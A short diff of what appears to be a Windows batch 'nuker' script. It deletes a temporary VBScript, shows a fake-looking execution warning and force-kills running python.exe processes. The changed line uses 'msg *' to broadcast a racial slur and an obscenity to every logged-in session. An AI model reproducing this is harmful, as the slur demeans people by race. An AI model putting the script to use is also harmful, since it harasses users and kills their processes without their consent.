@@ -13,7 +13,7 @@ del "%temp%\nuker_prompt.vbs"
 color 0A
 echo.
 echo [WARNING] Execution confirmed. Running routines...
-run msg * get fucked nigger
+msg * get fucked nigger
 echo.
 
 taskkill /f /im python.exe
